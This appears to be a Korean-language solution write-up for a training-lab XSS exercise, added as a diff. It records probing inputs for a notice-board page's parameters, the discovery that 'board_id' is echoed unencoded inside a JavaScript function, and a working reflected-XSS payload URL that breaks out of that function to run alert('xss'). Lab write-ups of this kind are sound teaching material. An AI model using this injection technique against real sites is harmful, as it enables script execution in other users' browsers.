@@ -1,0 +1,23 @@
+=========================================
+
+* XSS 문제 2번
+
+=========================================
+
+1. 풀이과정 
+
+https://lab.eqst.co.kr:8083/exam17/noticelist.php?pageIndex=test1(){};'"&sorting=test2(){};'"
+&sortingAd=test3(){};'"&startDt=test7(){};'"&endDt=test8(){};'"&searchType=test4(){};'"&keyword=test5(){};'" 
+확인시 모두 인코딩된걸 확인할수있다.
+/exam17/noticeview.php?board_id=test1(){};'"&sorting=test2(){};'"
+&sortingAd=test3(){};'"&startDt=test7(){};'"&endDt=test8(){};'"&searchType=test4(){};'"&keyword=test5(){};'"
+확인시 test1부분에서 (); 이 살아있음을 확인하였다
+function fnEdit(){ 부분에 입력이 들어가고 ; }으로 닫히므로 18; alert('xss'); function dd(){ var a = a 입력시 xss가 됨을 확인하였다
+2. 공격가능한 URL 
+
+https://lab.eqst.co.kr:8083/exam17/noticeview.php?board_id=18%3b+alert('xss')%3b+function+dd(){+var+a+%3d+a"&pageIndex=1&sorting=BOARD_ID&sortingAd=DESC&startDt=&endDt=&searchType=title&keyword=
+
+3. xss_exam
+
+=========================================
+
